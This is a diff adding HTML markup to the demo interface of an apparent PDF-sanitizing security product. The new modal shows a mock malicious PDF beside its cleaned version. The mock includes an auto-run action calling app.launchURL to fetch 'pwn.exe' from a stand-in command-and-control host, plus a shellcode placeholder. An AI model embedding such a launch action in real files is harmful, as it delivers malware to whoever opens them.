+                <span class="badge badge-red">UNTRUSTED ORIGINAL (E:\Corporate_Brief.pdf)</span>
+                <span class="pane-meta">Size: 4.8 MB • Active Macros Detected</span>
+              </div>
+              <pre class="code-view">
+<code>&lt;PDF-Header Version="1.7"&gt;
+  &lt;Catalog Object="1 0 R"&gt;
+    &lt;Pages Object="2 0 R"/&gt;
+    <mark class="threat-tag">&lt;Names&gt;
+      &lt;JavaScript Object="8 0 R"&gt;
+        &lt;Action&gt;app.launchURL("http://evil-c2.net/pwn.exe")&lt;/Action&gt;
+      &lt;/JavaScript&gt;
+    &lt;/Names&gt;</mark>
+    <mark class="threat-tag">&lt;OpenAction Object="9 0 R" /&gt;  &lt;!-- AUTO-EXECUTE ON MOUNT --&gt;</mark>
+  &lt;/Catalog&gt;
+  &lt;Object ID="12" Type="Stream"&gt;
+    <mark class="threat-tag">[SHELLCODE PAYLOAD: 2,048 BYTES BUFFER OVERFLOW]</mark>
+  &lt;/Object&gt;
+&lt;/PDF-EOF&gt;</code>
+              </pre>
+            </div>
+
+            <!-- Center Transformation Arrow -->
+            <div class="cdr-diff-divider">
+              <div class="divider-arrow">➔</div>
+              <div class="divider-label">
+                <span>Pure-Rust</span>
+                <span>AST Sanitizer</span>
+                <span class="latency-pill">&lt; 4.6 ms</span>
+              </div>
+            </div>
+
+            <!-- Right Pane: Reconstructed Clean AST -->
+            <div class="cdr-pane cdr-sanitized">
+              <div class="pane-header">
+                <span class="badge badge-green">STERILE PROJECTION (Z:\Corporate_Brief.pdf)</span>
+                <span class="pane-meta">Size: 4.2 MB • Zero Active Scripts</span>
+              </div>
+              <pre class="code-view">
+<code>&lt;PDF-Header Version="1.7" Linearized="true"&gt;
+  &lt;Catalog Object="1 0 R"&gt;
+    &lt;Pages Object="2 0 R"/&gt;
+    &lt;!-- /Names/JavaScript completely purged by AST Walker --&gt;
+    &lt;!-- /OpenAction purged --&gt;
+  &lt;/Catalog&gt;
+  &lt;Object ID="12" Type="Stream" Filter="FlateDecode"&gt;
+    [BENIGN TEXT &amp; FONT GLYPH STREAM RE-SERIALIZED]
+  &lt;/Object&gt;
+  &lt;Metadata&gt;
+    &lt;SanitizedBy&gt;OmniConnect-Sentinel-CDR-v0.1.0&lt;/SanitizedBy&gt;
+    &lt;Attestation&gt;SHA256: 3a9f01bc89a...&lt;/Attestation&gt;
+  &lt;/Metadata&gt;
+&lt;/PDF-EOF&gt;</code>
+              </pre>
+            </div>
+          </div>
+        </div>
+        
+        <div class="modal-footer">
+          <span>Sanitization Engine: <strong>Pure-Safe Rust (crates/sentinel-cdr)</strong></span>
+          <button id="btnVerifyCdrHash" class="btn btn-sm btn-primary">Attest SHA-256 Hash</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===================================================================== -->
+    <!-- MODAL: MITRE ATT&CK TECHNIQUE EXPLAINER                               -->
+    <!-- ===================================================================== -->
+    <div class="modal-overlay" id="mitreModal" style="display: none;">
+      <div class="modal-container modal-sm">
+        <div class="modal-header">
+          <div class="modal-title">
+            <span class="modal-icon">🎯</span>
+            <h3 id="mitreModalTitle">MITRE ATT&CK Technique</h3>
+          </div>
+          <button id="btnCloseMitreModal" class="modal-close-btn">&times;</button>
+        </div>
+        <div class="modal-body" id="mitreModalBody">
+          <!-- Populated dynamically via JS -->
+        </div>
+      </div>
+    </div>
+
+    <!-- Toast Notification Container (ask-sonner inspired) -->
+    <div class="toast-container" id="toastContainer" aria-live="polite"></div>
+
+    <!-- Dev Testing & Stress-Test Toggle (break-ui skill) -->
+    <div class="dev-break-toggle">
+      <span class="dev-label">UI STRESS MODE:</span>
+      <div class="segmented-pill">
+        <button id="btnDataDemo" class="pill-opt active">Standard Demo</button>
+        <button id="btnDataWorst" class="pill-opt">Worst-Case Break (50k Files / BiDi)</button>
+      </div>
+    </div>
+
     <!-- Footer Status Bar -->
     <footer class="footer">
-      <div>Zero-Trust Compliance: <strong>NIST SP 800-207</strong> · <strong>IEC 62443</strong> · <strong>SOC 2 Type II</strong></div>
+      <div>Enterprise Zero-Trust: <strong>NIST SP 800-207</strong> • <strong>NIST SP 800-88 Rev 1</strong> • <strong>IEC 62443</strong> • <strong>SOC 2 Type II</strong></div>
       <div class="footer-stats">
-        <span>Total Latency: <strong>4.2ms</strong></span>
-        <span>Memory Overhead: <strong>42 MB</strong></span>
-        <span>Kernel BSOD Risk: <strong>0.000%</strong></span>
+        <span>Latency: <strong id="footLatency">4.2ms</strong></span>
+        <span>Memory Overhead: <strong id="footMem">42 MB</strong></span>
+        <span>Ring 0 Driver: <strong>NONE (Ring 3 Userspace)</strong></span>
+        <span>BSOD Probability: <strong class="text-green">0.000%</strong></span>
       </div>
     </footer>
   </div>
